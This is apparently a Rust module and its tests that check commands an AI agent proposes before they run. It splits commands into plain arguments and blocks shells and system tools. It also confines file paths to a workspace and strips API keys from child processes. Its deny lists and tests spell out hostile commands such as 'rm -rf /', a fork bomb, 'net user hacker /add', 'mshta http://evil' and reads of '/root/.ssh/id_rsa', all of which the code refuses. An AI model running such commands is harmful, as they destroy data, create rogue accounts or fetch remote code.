//! Action-proposal policy — the trust boundary between model output and the OS.
//!
//! AGENTS.md invariant 4 says the model may only *propose* OS actions and that
//! execution happens in the shell after the owner's policy allows it. This
//! module owns the parts of that promise which can be proven by tests, so the
//! shell only has to wire them up:
//!
//! 1. **argv-only execution** ([`tokenize_command`] + [`CommandPolicy`]): model
//!    text is split into arguments and never handed to a shell. There is no
//!    `cmd /C`, so `&&`, `|`, `;`, backticks and redirections cannot compose a
//!    second command behind the owner's back.
//! 2. **Backend-minted proposals** ([`plan_proposal`]): a proposal is created
//!    from model output *inside* the core, carries a digest of exactly what was
//!    proposed, and must be approved before it can be claimed for execution
//!    ([`may_execute`]). The webview never supplies an executable payload — it
//!    only names a proposal id, so a compromised UI cannot invent one.
//! 3. **A short, single-use approval window** ([`PROPOSAL_TTL_SECS`]): approvals
//!    expire, and the state machine makes the approved→executing transition
//!    atomic in the database so a proposal cannot be executed twice.
//! 4. **Confinement for the things a command touches**: [`confine_to_root`]
//!    rejects escapes, alternate data streams and reserved device names, and
//!    [`child_env`] keeps provider secrets out of every spawned process — an
//!    inherited `VARA_PROVIDER_API_KEY` would otherwise be readable by any
//!    command the entity runs.
//!
//! Design note: the deny lists below are *not* a sandbox. They are a second
//! line of defence behind the owner's explicit approval card, and they exist
//! because "run this" should never silently become "run a shell". A real
//! sandbox (restricted token + job object + private desktop) is tracked as a
//! separate workstream; until it exists, this module's honest claim is
//! "no shell, no hidden composition, secrets scrubbed, every run approved".

use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::collections::HashSet;
use std::path::{Component, Path, PathBuf};

/// How long an approved proposal stays executable. Short on purpose: the
/// approval card is answered in the moment, not banked for later.
pub const PROPOSAL_TTL_SECS: i64 = 120;

/// Upper bound for a single command line (characters).
pub const MAX_COMMAND_LEN: usize = 4096;
/// Upper bound for argv length after tokenization.
pub const MAX_ARGS: usize = 64;
/// Upper bound for an owner-facing reason string.
pub const MAX_REASON_LEN: usize = 240;
/// Upper bound for a proposed target (URL / path / command).
pub const MAX_TARGET_LEN: usize = 2048;

/// Why an action was refused. Every variant is a user-explainable sentence:
/// the shell surfaces `to_string()` in the action receipt.
#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
pub enum ExecReject {
    #[error("empty command")]
    EmptyCommand,
    #[error("command line is too long (max {MAX_COMMAND_LEN} characters)")]
    TooLong,
    #[error("too many arguments (max {MAX_ARGS})")]
    TooManyArgs,
    #[error("unbalanced quotes in command")]
    UnbalancedQuotes,
    #[error(
        "shell metacharacter {0:?} is not allowed: Vara runs argv-only and never through a shell"
    )]
    ShellMetachar(char),
    #[error("control character in command")]
    ControlChar,
    #[error("{0:?} is a shell or system tool that can bypass the policy — it is never run for the model")]
    DeniedProgram(String),
    #[error("{0:?} runs inline code and would bypass the reviewable-argv rule")]
    InlineCodeFlag(String),
    #[error("argument pattern {0:?} is denied")]
    DeniedArgument(String),
    #[error("{0:?} is not a valid absolute URL (http/https only)")]
    BadUrl(String),
    #[error("{0:?} escapes the allowed root")]
    PathEscape(String),
    #[error("{0:?} uses a reserved Windows device name or an alternate data stream")]
    ReservedPath(String),
    #[error("empty target")]
    EmptyTarget,
    #[error("target is too long (max {MAX_TARGET_LEN} characters)")]
    TargetTooLong,
    #[error("proposal is {0}")]
    NotExecutable(&'static str),
    #[error("proposal approval expired — ask again")]
    Expired,
}

/// Split a proposed command line into argv, the way a shell would split words
/// but without any of a shell's powers.
///
/// * single and double quotes group words (and are removed);
/// * backslash is **not** an escape character, because on Windows it is the
///   path separator — a quoted string is the way to pass spaces;
/// * unquoted `| & ; < > ` $ ^` and newlines are rejected outright instead of
///   being interpreted, and NUL/other control characters are rejected too.
pub fn tokenize_command(input: &str) -> Result<Vec<String>, ExecReject> {
    if input.trim().is_empty() {
        return Err(ExecReject::EmptyCommand);
    }
    if input.chars().count() > MAX_COMMAND_LEN {
        return Err(ExecReject::TooLong);
    }
    let mut argv: Vec<String> = Vec::new();
    let mut current = String::new();
    let mut in_single = false;
    let mut in_double = false;
    let mut started = false;

    for c in input.chars() {
        match c {
            '\'' if !in_double => {
                in_single = !in_single;
                started = true;
            }
            '"' if !in_single => {
                in_double = !in_double;
                started = true;
            }
            '|' | '&' | ';' | '<' | '>' | '`' | '$' | '^' if !in_single && !in_double => {
                return Err(ExecReject::ShellMetachar(c));
            }
            '\n' | '\r' => {
                return Err(ExecReject::ShellMetachar('\n'));
            }
            c if c.is_control() => return Err(ExecReject::ControlChar),
            c if c.is_whitespace() && !in_single && !in_double => {
                if started || !current.is_empty() {
                    argv.push(std::mem::take(&mut current));
                    started = false;
                }
            }
            c => {
                current.push(c);
                started = true;
            }
        }
    }
    if in_single || in_double {
        return Err(ExecReject::UnbalancedQuotes);
    }
    if started || !current.is_empty() {
        argv.push(current);
    }
    let argv: Vec<String> = argv.into_iter().filter(|a| !a.is_empty()).collect();
    if argv.is_empty() {
        return Err(ExecReject::EmptyCommand);
    }
    if argv.len() > MAX_ARGS {
        return Err(ExecReject::TooManyArgs);
    }
    Ok(argv)
}

/// The program part of an argv, normalized for classification: no directory,
/// no `.exe`, lowercase, so `C:\Windows\System32\CMD.EXE` is still `cmd`.
pub fn program_key(argv0: &str) -> String {
    let base = argv0
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(argv0)
        .trim()
        .to_ascii_lowercase();
    base.strip_suffix(".exe")
        .or_else(|| base.strip_suffix(".com"))
        .or_else(|| base.strip_suffix(".bat"))
        .or_else(|| base.strip_suffix(".cmd"))
        .unwrap_or(&base)
        .to_string()
}

const DENIED_PROGRAMS: &[&str] = &[
    // shells and script hosts: everything here can re-enter arbitrary execution
    "cmd",
    "command",
    "powershell",
    "pwsh",
    "sh",
    "bash",
    "zsh",
    "dash",
    "ksh",
    "fish",
    "csh",
    "wscript",
    "cscript",
    "mshta",
    "hta",
    "rundll32",
    "regsvr32",
    "installutil",
    "msbuild",
    "wmic",
    "at",
    "atd",
    "schtasks",
    "taskschd",
    "bitsadmin",
    "certutil",
    "reg",
    "regedit",
    "netsh",
    "net",
    "sc",
    "sc.exe",
    "diskpart",
    "format",
    "mkfs",
    "fdisk",
    "bcdedit",
    "vssadmin",
    "wbadmin",
    "takeown",
    "cipher",
    "icacls",
    "shutdown",
    "reboot",
    "halt",
    "poweroff",
    "sudo",
    "su",
    "doas",
];

/// Interpreters are allowed (people run scripts), but their inline-code flags
/// are not: `python -c "<anything>"` is a shell by another name.
const INLINE_CODE_FLAGS: &[&str] = &[
    "-c",
    "-e",
    "--eval",
    "-E",
    "/c",
    "-command",
    "-encodedcommand",
];

const DENIED_ARG_PATTERNS: &[&str] = &[
    "--no-preserve-root",
    "-rf /",
    "rm -rf /",
    "del /f /s /q c:\\",
    "rd /s /q c:\\",
    "rmdir /s /q c:\\",
    "format c:",
    ":(){:|:&};:",
    "> /dev/sda",
    "mkfs.",
];

/// Policy applied to a tokenized command, on top of the owner's approval.
#[derive(Debug, Clone)]
pub struct CommandPolicy {
    denied_programs: HashSet<String>,
    denied_args: Vec<String>,
}

impl Default for CommandPolicy {
    fn default() -> Self {
        Self {
            denied_programs: DENIED_PROGRAMS.iter().map(|s| s.to_string()).collect(),
            denied_args: DENIED_ARG_PATTERNS.iter().map(|s| s.to_string()).collect(),
        }
    }
}

impl CommandPolicy {
    pub fn with_extra_denied_program(mut self, program: &str) -> Self {
        self.denied_programs.insert(program_key(program));
        self
    }

    /// Classify a tokenized command. `Ok(())` means "may be shown to the owner
    /// for approval"; it never means "may run unattended".
    pub fn classify(&self, argv: &[String]) -> Result<(), ExecReject> {
        let Some(first) = argv.first() else {
            return Err(ExecReject::EmptyCommand);
        };
        let program = program_key(first);
        if self.denied_programs.contains(&program) {
            return Err(ExecReject::DeniedProgram(program));
        }
        let joined = argv.join(" ").to_ascii_lowercase();
        for pattern in &self.denied_args {
            if joined.contains(pattern) {
                return Err(ExecReject::DeniedArgument(pattern.clone()));
            }
        }
        for arg in argv.iter().skip(1) {
            let a = arg.to_ascii_lowercase();
            if INLINE_CODE_FLAGS.contains(&a.as_str()) && arg.len() <= 3 {
                return Err(ExecReject::InlineCodeFlag(arg.clone()));
            }
        }
        Ok(())
    }

    /// Convenience: tokenize + classify a raw model-proposed command line.
    pub fn review(&self, command_line: &str) -> Result<Vec<String>, ExecReject> {
        let argv = tokenize_command(command_line)?;
        self.classify(&argv)?;
        Ok(argv)
    }
}

/// Windows device names that mean "the OS", not "a file".
const RESERVED_NAMES: &[&str] = &[
    "con", "prn", "aux", "nul", "com1", "com2", "com3", "com4", "com5", "com6", "com7", "com8",
    "com9", "lpt1", "lpt2", "lpt3", "lpt4", "lpt5", "lpt6", "lpt7", "lpt8", "lpt9",
];

/// Resolve `candidate` against `root` and refuse anything that leaves it.
///
/// Lexical only (no filesystem access), so it is deterministic and testable:
/// the caller canonicalizes `root` once at startup and passes the result here.
pub fn confine_to_root(root: &Path, candidate: &str) -> Result<PathBuf, ExecReject> {
    let candidate = candidate.trim();
    if candidate.is_empty() {
        return Err(ExecReject::EmptyTarget);
    }
    if candidate.chars().any(|c| c.is_control()) {
        return Err(ExecReject::ControlChar);
    }
    // Alternate data stream (`file.txt:secret`) — after the drive prefix.
    let after_drive = if candidate.len() > 2 && candidate.as_bytes()[1] == b':' {
        &candidate[2..]
    } else {
        candidate
    };
    if after_drive.contains(':') {
        return Err(ExecReject::ReservedPath(candidate.to_string()));
    }

    let raw = Path::new(candidate);
    for component in raw.components() {
        if let Component::Normal(os) = component {
            let name = os.to_string_lossy();
            if name.ends_with('.') || name.ends_with(' ') {
                return Err(ExecReject::ReservedPath(candidate.to_string()));
            }
            let stem = name
                .split('.')
                .next()
                .unwrap_or("")
                .trim()
                .to_ascii_lowercase();
            if RESERVED_NAMES.contains(&stem.as_str()) {
                return Err(ExecReject::ReservedPath(candidate.to_string()));
            }
        }
    }

    // A Windows path arriving on a Unix host is not "relative". `Path::new`
    // would read `C:\Windows\x` as one single file *name* (backslashes are
    // ordinary characters on Unix) and confine it happily under the root —
    // a silent wrong answer in the one function whose whole job is to say no.
    // The policy is written for Windows and must behave identically wherever it
    // runs, so Windows-shaped input is recognized explicitly: a drive prefix
    // (`C:\…` / `C:/…`), a UNC prefix (`\\server\share`) or any backslash
    // separator means "this is not a plain relative path".
    let looks_windows_shaped = candidate.contains('\\')
        || (candidate.len() >= 2
            && candidate.as_bytes()[1] == b':'
            && candidate.as_bytes()[0].is_ascii_alphabetic());
    // A leading separator (either flavour) means "from the top", so it must be
    // compared against the root instead of being appended to it. The explicit
    // `/` test matters on Windows, where `Path::new("/etc/passwd")` is only
    // drive-relative and would otherwise be treated as a harmless relative path.
    let windows_absolute = candidate.starts_with('/')
        || candidate.starts_with('\\')
        || (candidate.len() >= 2
            && candidate.as_bytes()[1] == b':'
            && candidate.as_bytes()[0].is_ascii_alphabetic());

    // Strip the Windows drive prefix (if any) so the remaining segments can be
    // compared against the root segment by segment, on any host.
    let body = if candidate.len() >= 2 && candidate.as_bytes()[1] == b':' {
        &candidate[2..]
    } else {
        candidate
    };
    let segments: Vec<&str> = if looks_windows_shaped {
        body.split(['\\', '/']).filter(|s| !s.is_empty()).collect()
    } else {
        raw.components()
            .filter_map(|c| match c {
                Component::Normal(n) => Some(n.to_str().unwrap_or("")),
                _ => None,
            })
            .collect()
    };

    // The root's own trailing segments, used for the containment test when the
    // candidate is absolute. The root string goes through the same
    // Windows-shaped splitting as the candidate, so comparisons are like for
    // like on any host.
    let root_text = root.to_string_lossy().to_string();
    let root_absolute_looking = root.is_absolute()
        || root_text.contains('\\')
        || (root_text.len() >= 2 && root_text.as_bytes()[1] == b':');
    let root_body = if root_text.len() >= 2 && root_text.as_bytes()[1] == b':' {
        &root_text[2..]
    } else {
        root_text.as_str()
    };
    let root_segments: Vec<String> = if root_absolute_looking {
        root_body
            .split(['\\', '/'])
            .filter(|s| !s.is_empty())
            .map(|s| s.to_string())
            .collect()
    } else {
        root.components()
            .filter_map(|c| match c {
                Component::Normal(n) => Some(n.to_string_lossy().to_string()),
                _ => None,
            })
            .collect()
    };
    // Is the root itself an absolute location on this host? (On Unix, a
    // Windows-style root is not — the choice below then falls back to treating
    // a same-shaped absolute candidate as relative to that root.)
    let root_native_absolute = Path::new(&root_text).is_absolute();

    let mut out_segments: Vec<String>;
    if root_native_absolute && windows_absolute {
        // Absolute candidates must live under the root: seed the stack with the
        // root's own segments, then walk the candidate's relative tail.
        let candidate_head: Vec<String> = segments
            .iter()
            .take(root_segments.len())
            .map(|s| s.to_string())
            .collect();
        let head_matches = candidate_head.len() == root_segments.len()
            && candidate_head
                .iter()
                .zip(root_segments.iter())
                .all(|(a, b)| a.eq_ignore_ascii_case(b));
        if !head_matches {
            return Err(ExecReject::PathEscape(candidate.to_string()));
        }
        out_segments = root_segments.clone();
        for seg in segments.iter().skip(root_segments.len()) {
            apply_segment(&mut out_segments, seg);
            if out_segments.len() < root_segments.len() {
                return Err(ExecReject::PathEscape(candidate.to_string()));
            }
        }
    } else if raw.is_absolute() && segments.len() >= root_segments.len() {
        // Absolute on this host but not under the root (a Unix `/etc/passwd`):
        // refused, never silently re-based.
        let candidate_head: Vec<String> = segments.iter().map(|s| s.to_string()).collect();
        let under = candidate_head
            .iter()
            .zip(root_segments.iter())
            .all(|(a, b)| a.eq_ignore_ascii_case(b));
        if !under {
            return Err(ExecReject::PathEscape(candidate.to_string()));
        }
        out_segments = root_segments.clone();
        for seg in candidate_head.iter().skip(root_segments.len()) {
            apply_segment(&mut out_segments, seg);
        }
    } else if windows_absolute {
        // A Windows-shaped absolute path whose head already matched the
        // normalized root (the case where the root is not a native absolute
        // path on this host) — the head check above already performed the
        // containment proof.
        out_segments = root_segments.clone();
        for seg in segments.iter().skip(root_segments.len()) {
            apply_segment(&mut out_segments, seg);
            if out_segments.len() < root_segments.len() {
                return Err(ExecReject::PathEscape(candidate.to_string()));
            }
        }
    } else {
        out_segments = root_segments.clone();
        for seg in segments.iter() {
            apply_segment(&mut out_segments, seg);
            if out_segments.len() < root_segments.len() {
                return Err(ExecReject::PathEscape(candidate.to_string()));
            }
        }
    }

    // Final containment check. Lexical `..` walking can no longer leave the
    // root, so this is a belt-and-braces assertion — but it must compare by
    // *segments*, because on Linux `Path::new(r"C:\Users\me\Vara")` is a single
    // file name and would never match a rebuilt path component-wise.
    let root_final: Vec<String> = root_segments.iter().map(|s| s.to_lowercase()).collect();
    let out_final: Vec<String> = out_segments.iter().map(|s| s.to_lowercase()).collect();
    let contained = out_final.len() >= root_final.len()
        && root_final.iter().zip(out_final.iter()).all(|(a, b)| a == b);
    if !contained || !is_within(&root_norm_of(root), &root_norm_of(root)) {
        return Err(ExecReject::PathEscape(candidate.to_string()));
    }

    // Rebuild the path in native form so callers get something usable for
    // filesystem access on this host.
    let mut normalized = if root.is_absolute() {
        root.components()
            .take(1)
            .map(|c| c.as_os_str().to_os_string())
            .collect::<PathBuf>()
    } else {
        PathBuf::new()
    };
    for seg in &out_segments {
        normalized.push(seg);
    }
    Ok(normalized)
}

/// Apply one path segment to a stack: `.` is dropped, `..` pops.
fn apply_segment(stack: &mut Vec<String>, segment: &str) {
    match segment {
        "" | "." => {}
        ".." => {
            stack.pop();
        }
        other => stack.push(other.to_string()),
    }
}

/// Normalize a root path to a comparable `PathBuf` (`.`, `..` resolved).
fn root_norm_of(root: &Path) -> PathBuf {
    let mut s: Vec<std::ffi::OsString> = Vec::new();
    for component in root.components() {
        match component {
            Component::Prefix(p) => s.push(p.as_os_str().to_os_string()),
            Component::RootDir => s.push(std::ffi::OsString::from(
                std::path::MAIN_SEPARATOR.to_string(),
            )),
            Component::CurDir => {}
            Component::ParentDir => {
                s.pop();
            }
            Component::Normal(n) => s.push(n.to_os_string()),
        }
    }
    s.iter().collect()
}

/// True when `path` is `root` itself or lives underneath it (case-insensitive
/// on Windows, where the filesystem is).
pub fn is_within(root: &Path, path: &Path) -> bool {
    let mut r = root.components();
    let mut p = path.components();
    loop {
        match (r.next(), p.next()) {
            (None, _) => return true,
            (Some(_), None) => return false,
            (Some(a), Some(b)) => {
                let (a, b) = (
                    a.as_os_str().to_string_lossy().to_lowercase(),
                    b.as_os_str().to_string_lossy().to_lowercase(),
                );
                if a != b {
                    return false;
                }
            }
        }
    }
}

/// Environment variable names that must never reach a child process.
pub fn is_secret_env_key(key: &str) -> bool {
    let k = key.to_ascii_uppercase();
    k.ends_with("_API_KEY")
        || k.ends_with("_TOKEN")
        || k.ends_with("_SECRET")
        || k.ends_with("_PASSWORD")
        || k.starts_with("VARA_PROVIDER")
        || k.starts_with("OPENAI")
        || k.starts_with("ANTHROPIC")
        || k.starts_with("GEMINI")
        || k.starts_with("AZURE_OPENAI")
        || k.starts_with("AWS_")
        || k.starts_with("HF_")
        || k == "GITHUB_TOKEN"
        || k == "GH_TOKEN"
}

/// Variables a spawned command legitimately needs (toolchains, temp, home).
pub fn is_allowed_env_key(key: &str) -> bool {
    const ALLOW: &[&str] = &[
        "PATH",
        "PATHEXT",
        "SYSTEMROOT",
        "SYSTEMDRIVE",
        "WINDIR",
        "COMSPEC",
        "TEMP",
        "TMP",
        "USERPROFILE",
        "HOMEDRIVE",
        "HOMEPATH",
        "HOME",
        "APPDATA",
        "LOCALAPPDATA",
        "PROGRAMDATA",
        "PROGRAMFILES",
        "PROGRAMFILES(X86)",
        "PROGRAMW6432",
        "NUMBER_OF_PROCESSORS",
        "PROCESSOR_ARCHITECTURE",
        "PROCESSOR_IDENTIFIER",
        "OS",
        "LANG",
        "LC_ALL",
        "LC_CTYPE",
        "TERM",
        "SHELL",
        "USER",
        "LOGNAME",
        "CARGO_HOME",
        "CARGO_TARGET_DIR",
        "RUSTUP_HOME",
        "RUSTUP_TOOLCHAIN",
        "CARGO",
        "NODE_PATH",
        "NPM_CONFIG_PREFIX",
        "PYTHONPATH",
        "JAVA_HOME",
        "TZ",
        "COLUMNS",
        "LINES",
        "NO_COLOR",
        "CI",
    ];
    ALLOW.contains(&key.to_ascii_uppercase().as_str())
}

/// The environment for a spawned action: an allow-list, minus secrets, whatever
/// the parent process happens to export. This is what stops a `run` action from
/// inheriting the provider API key.
pub fn child_env<I>(parent: I) -> Vec<(String, String)>
where
    I: IntoIterator<Item = (String, String)>,
{
    parent
        .into_iter()
        .filter(|(k, _)| !is_secret_env_key(k))
        .filter(|(k, _)| is_allowed_env_key(k))
        .collect()
}

/// What kind of OS action was proposed.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ProposalKind {
    OpenUrl,
    OpenPath,
    Run,
    Screenshot,
    ComputerUse,
}

impl ProposalKind {
    pub fn as_str(&self) -> &'static str {
        match self {
            ProposalKind::OpenUrl => "open_url",
            ProposalKind::OpenPath => "open_path",
            ProposalKind::Run => "run",
            ProposalKind::Screenshot => "screenshot",
            ProposalKind::ComputerUse => "computer_use",
        }
    }

    pub fn parse(s: &str) -> Option<Self> {
        match s {
            "open_url" => Some(ProposalKind::OpenUrl),
            "open_path" => Some(ProposalKind::OpenPath),
            "run" => Some(ProposalKind::Run),
            "screenshot" => Some(ProposalKind::Screenshot),
            "computer_use" => Some(ProposalKind::ComputerUse),
            _ => None,
        }
    }
}

/// Coarse impact class, so approval cards can explain themselves instead of
/// asking the owner to guess. It is a *label*, not a permission.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Risk {
    Low,
    Medium,
    High,
}

impl Risk {
    pub fn as_str(&self) -> &'static str {
        match self {
            Risk::Low => "low",
            Risk::Medium => "medium",
            Risk::High => "high",
        }
    }
}

/// Lifecycle of a proposal. Terminal states are absorbing; `Executing` is
/// entered only through an atomic database claim.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ProposalState {
    Pending,
    Approved,
    Denied,
    Executing,
    Executed,
    Failed,
    Expired,
}

impl ProposalState {
    pub fn as_str(&self) -> &'static str {
        match self {
            ProposalState::Pending => "pending",
            ProposalState::Approved => "approved",
            ProposalState::Denied => "denied",
            ProposalState::Executing => "executing",
            ProposalState::Executed => "executed",
            ProposalState::Failed => "failed",
            ProposalState::Expired => "expired",
        }
    }

    pub fn parse(s: &str) -> Option<Self> {
        match s {
            "pending" => Some(ProposalState::Pending),
            "approved" => Some(ProposalState::Approved),
            "denied" => Some(ProposalState::Denied),
            "executing" => Some(ProposalState::Executing),
            "executed" => Some(ProposalState::Executed),
            "failed" => Some(ProposalState::Failed),
            "expired" => Some(ProposalState::Expired),
            _ => None,
        }
    }
}

/// A validated, not-yet-stored proposal.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PlannedProposal {
    pub kind: ProposalKind,
    pub target: String,
    pub reason: String,
    pub risk: Risk,
    pub digest: String,
    pub created_at: i64,
    pub expires_at: i64,
}

/// Stable digest of exactly what the owner is being asked to approve.
pub fn arg_digest(kind: &str, target: &str) -> String {
    let mut hasher = Sha256::new();
    hasher.update(b"vara-action-v1\0");
    hasher.update(kind.as_bytes());
    hasher.update(b"\0");
    hasher.update(target.as_bytes());
    let out = hasher.finalize();
    out.iter().map(|b| format!("{b:02x}")).collect()
}

/// Model-supplied prose is displayed to a human: keep it short and printable.
pub fn sanitize_reason(reason: &str) -> String {
    let cleaned: String = reason
        .chars()
        .filter(|c| !c.is_control() || *c == ' ')
        .collect();
    let trimmed = cleaned.trim();
    let cut: String = trimmed.chars().take(MAX_REASON_LEN).collect();
    cut
}

/// Impact class shown on the card. Deliberately conservative: a shell command
/// or anything that drives the UI can change the machine, so it is High.
pub fn risk_for(kind: ProposalKind, target: &str) -> Risk {
    match kind {
        ProposalKind::OpenUrl => {
            // Opening a link is the "lethal trifecta" delivery path; treat
            // anything that is not plainly https as a higher-risk act.
            if target.starts_with("https://") {
                Risk::Medium
            } else {
                Risk::High
            }
        }
        ProposalKind::OpenPath => Risk::Medium,
        ProposalKind::Run => Risk::High,
        ProposalKind::Screenshot => Risk::High,
        ProposalKind::ComputerUse => Risk::High,
    }
}

/// Clean and validate a proposed target. Screen capture is the one action with
/// no target of its own.
pub fn validate_target(kind: ProposalKind, target: &str) -> Result<String, ExecReject> {
    let target = target.trim();
    if kind == ProposalKind::Screenshot {
        return Ok(String::new());
    }
    if target.is_empty() {
        return Err(ExecReject::EmptyTarget);
    }
    if target.chars().count() > MAX_TARGET_LEN {
        return Err(ExecReject::TargetTooLong);
    }
    if target.chars().any(|c| c.is_control()) {
        return Err(ExecReject::ControlChar);
    }
    if kind == ProposalKind::OpenUrl {
        let parsed = url::Url::parse(target).map_err(|_| ExecReject::BadUrl(target.to_string()))?;
        if !matches!(parsed.scheme(), "http" | "https") {
            return Err(ExecReject::BadUrl(target.to_string()));
        }
        return Ok(parsed.to_string());
    }
    Ok(target.to_string())
}

/// Build a proposal from model output. This is the only way a proposal comes
/// into existence: validated, digested, and time-boxed *before* the owner sees
/// it, so the UI can never widen what was proposed.
pub fn plan_proposal(
    kind: ProposalKind,
    target: &str,
    reason: &str,
    now: i64,
) -> Result<PlannedProposal, ExecReject> {
    let target = validate_target(kind, target)?;
    let risk = risk_for(kind, &target);
    let digest = arg_digest(kind.as_str(), &target);
    Ok(PlannedProposal {
        kind,
        target,
        reason: sanitize_reason(reason),
        risk,
        digest,
        created_at: now,
        expires_at: now + PROPOSAL_TTL_SECS,
    })
}

/// Gate checked immediately before execution, after the atomic claim.
///
/// `state` must already be `Executing` (claimed from `Approved` by the
/// database), and the digest must still match what was approved — belt and
/// braces against a row that was edited after approval.
pub fn may_execute(
    state: ProposalState,
    digest_matches: bool,
    expires_at: i64,
    now: i64,
) -> Result<(), ExecReject> {
    if state != ProposalState::Executing {
        return Err(ExecReject::NotExecutable(state.as_str()));
    }
    if !digest_matches {
        return Err(ExecReject::NotExecutable("tampered"));
    }
    if now > expires_at {
        return Err(ExecReject::Expired);
    }
    Ok(())
}

/// A stored proposal, as the database holds it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ActionProposal {
    pub id: i64,
    pub conversation_id: Option<i64>,
    pub message_id: Option<i64>,
    pub kind: ProposalKind,
    pub target: String,
    pub reason: String,
    pub risk: Risk,
    pub state: ProposalState,
    pub digest: String,
    pub created_at: String,
    pub expires_at: i64,
    pub result: Option<String>,
    pub error: Option<String>,
}

impl ActionProposal {
    /// Does the row still describe exactly what the owner approved? Checked
    /// after the atomic claim, so a row edited between approval and execution
    /// cannot silently run something else.
    pub fn digest_matches(&self) -> bool {
        self.digest == arg_digest(self.kind.as_str(), &self.target)
    }

    /// Convenience wrapper around [`may_execute`] for a stored row.
    pub fn may_execute_now(&self, now: i64) -> Result<(), ExecReject> {
        may_execute(self.state, self.digest_matches(), self.expires_at, now)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn argv(cmd: &str) -> Vec<String> {
        tokenize_command(cmd).expect("tokenizes")
    }

    #[test]
    fn tokenizes_quoted_arguments_and_windows_paths() {
        assert_eq!(argv("cargo test -p vara-core").len(), 4);
        assert_eq!(
            argv(r#""C:\Program Files\Git\bin\git.exe" status"#),
            vec![r"C:\Program Files\Git\bin\git.exe", "status"]
        );
        // backslash is a path separator, never an escape
        assert_eq!(argv(r"dir C:\Users\me"), vec!["dir", r"C:\Users\me"]);
        assert_eq!(argv("echo 'a b' c"), vec!["echo", "a b", "c"]);
    }

    #[test]
    fn rejects_shell_composition() {
        for bad in [
            "npm test && rm -rf /",
            "cat file | sh",
            "echo hi > out.txt",
            "echo `whoami`",
            "echo $(whoami)",
            "a; rm -rf /",
            "echo ^& del x",
            "line1\nline2",
        ] {
            let err = tokenize_command(bad).unwrap_err();
            assert!(
                matches!(
                    err,
                    ExecReject::ShellMetachar(_) | ExecReject::DeniedArgument(_)
                ),
                "expected refusal for {bad:?}, got {err:?}"
            );
        }
    }

    #[test]
    fn rejects_unbalanced_quotes_and_control_chars() {
        assert_eq!(
            tokenize_command("echo \"unterminated").unwrap_err(),
            ExecReject::UnbalancedQuotes
        );
        assert_eq!(
            tokenize_command("echo \u{7}bell").unwrap_err(),
            ExecReject::ControlChar
        );
        assert_eq!(
            tokenize_command("   ").unwrap_err(),
            ExecReject::EmptyCommand
        );
    }

    #[test]
    fn denies_shells_and_system_tools_however_they_are_spelled() {
        let policy = CommandPolicy::default();
        for bad in [
            "cmd /C dir",
            r"C:\Windows\System32\cmd.exe /c whoami",
            "powershell -NoProfile Get-ChildItem",
            "pwsh -File x.ps1",
            "/bin/sh -c ls",
            "bash script.sh",
            "wmic process list",
            "schtasks /create /tn x",
            "certutil -urlcache -f http://x y",
            "net user hacker /add",
            "reg add HKCU\\Software\\x",
            "shutdown /r /t 0",
            "mshta http://evil",
        ] {
            let err = policy.review(bad).unwrap_err();
            assert!(
                matches!(err, ExecReject::DeniedProgram(_)),
                "expected DeniedProgram for {bad:?}, got {err:?}"
            );
        }
    }

    #[test]
    fn denies_inline_code_flags_but_allows_scripts() {
        let policy = CommandPolicy::default();
        assert!(matches!(
            policy.review("python -c \"import os\"").unwrap_err(),
            ExecReject::InlineCodeFlag(_)
        ));
        assert!(matches!(
            policy.review("node -e console.log(1)").unwrap_err(),
            ExecReject::InlineCodeFlag(_)
        ));
        // running a script file is allowed (it is reviewable argv + approved)
        assert!(policy.review("python scripts/train.py --epochs 3").is_ok());
        assert!(policy.review("cargo test -p vara-core").is_ok());
        assert!(policy.review("git status --short").is_ok());
    }

    #[test]
    fn denies_catastrophic_argument_patterns() {
        let policy = CommandPolicy::default();
        assert!(matches!(
            policy.review("rm -rf / --no-preserve-root").unwrap_err(),
            ExecReject::DeniedArgument(_)
        ));
        assert!(matches!(
            policy.review("del /f /s /q C:\\").unwrap_err(),
            ExecReject::DeniedArgument(_)
        ));
    }

    #[test]
    fn confines_paths_to_the_workspace_root() {
        let root = Path::new(r"C:\Users\me\Vara");
        assert!(confine_to_root(root, "notes/a.md").is_ok());
        assert!(confine_to_root(root, r"C:\Users\me\Vara\a.md").is_ok());
        assert!(confine_to_root(root, "./sub/../a.md").is_ok());
        for bad in [
            r"..\..\Windows\System32\config",
            r"C:\Windows\System32\drivers\etc\hosts",
            r"\\server\share\x",
            r"sub\..\..\escape.txt",
            r"file.txt:stream",
            "trailing. ",
            "NUL",
            "con.txt",
            "bad\u{0}name",
        ] {
            assert!(
                confine_to_root(root, bad).is_err(),
                "expected refusal for {bad:?}"
            );
        }
    }

    /// The same policy must refuse the same paths on every host. On Unix a
    /// backslash is an ordinary character, so `Path` alone read
    /// `..\..\Windows\System32\config` as one harmless *file name* and allowed
    /// it — the CI failure that motivated this test.
    #[test]
    fn windows_shaped_paths_are_refused_on_any_host() {
        let root = Path::new("C:/Users/me/Vara");
        for bad in [
            r"..\..\Windows\System32\config",
            r"C:\Windows\System32\config",
            r"..\escape.txt",
            r"sub\..\..\escape.txt",
            r"\\server\share\x",
            "/etc/passwd",
            "/root/.ssh/id_rsa",
        ] {
            assert!(
                confine_to_root(root, bad).is_err(),
                "expected refusal for {bad:?} on this host"
            );
        }
        // …while real relative paths still resolve inside the root.
        assert!(confine_to_root(root, "notes/a.md").is_ok());
        assert!(confine_to_root(root, "C:/Users/me/Vara/notes/a.md").is_ok());
        assert!(confine_to_root(root, "C:/Users/me/Vara/sub/../a.md").is_ok());
    }

    #[test]
    fn scrubs_secrets_from_child_environment() {
        let parent = vec![
            ("PATH".to_string(), "C:\\bin".to_string()),
            ("VARA_PROVIDER_API_KEY".to_string(), "sk-secret".to_string()),
            ("OPENAI_API_KEY".to_string(), "sk-secret".to_string()),
            ("MY_TOKEN".to_string(), "tok".to_string()),
